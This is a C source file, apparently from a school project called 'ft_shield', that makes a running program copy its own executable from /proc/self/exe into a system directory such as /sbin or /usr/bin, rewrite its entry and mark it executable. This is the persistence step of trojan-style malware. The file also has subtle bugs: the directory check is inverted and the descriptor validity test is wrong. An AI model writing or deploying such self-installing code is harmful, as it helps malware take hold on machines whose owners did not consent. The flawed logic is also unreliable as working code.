/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   copy.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 02:22:51 by kiroussa          #+#    #+#             */
/*   Updated: 2025/05/25 16:47:11 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <fcntl.h>
#include <shield.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define TARGET_FILE_NAME "ft_shield"
#define BUFFER_SIZE 65536

static inline bool	shield_directory_exists(const char *dir)
{
	struct stat	s;

	if (!stat(dir, &s))
		return (false);
	if (!S_ISDIR(s.st_mode))
		return (false);
	return (true);
}

static inline int	shield_find_target(void)
{
	if (SHIELD_DEBUG)
		return (open("daemon_" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
	if (shield_directory_exists("/sbin"))
		return (open("/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
	if (shield_directory_exists("/usr/sbin"))
		return (open("/usr/sbin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
	if (shield_directory_exists("/bin"))
		return (open("/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
	if (shield_directory_exists("/usr/bin"))
		return (open("/usr/bin/" TARGET_FILE_NAME, O_RDWR | O_CREAT, 0644));
	return (-1);
}

static inline void	cleanup_fd(const int fd)
{
	if (fd >= 0)
		close(fd);
}

static inline bool	shield_copy_file(int from, int to)
{
	char	buf[BUFFER_SIZE];
	ssize_t	nread;
	ssize_t	nwritten;

	while (true)
	{
		nread = read(from, buf, sizeof(buf));
		if (nread < 0)
			return (true);
		if (nread == 0)
			break ;
		nwritten = write(to, buf, nread);
		if (nwritten != nread)
			return (true);
	}
	return (false);
}

int	shield_copy(void)
{
	const int	orig = open("/proc/self/exe", O_RDONLY);
	const int	bin = shield_find_target();
	bool		err;

	err = true;
	if (orig && bin)
	{
		err = shield_copy_file(orig, bin);
		if (!err)
			err = shield_change_entry(bin);
		if (!err)
			err = (fchmod(bin, 0755) < 0);
	}
	cleanup_fd(orig);
	cleanup_fd(bin);
	return (!err);
}
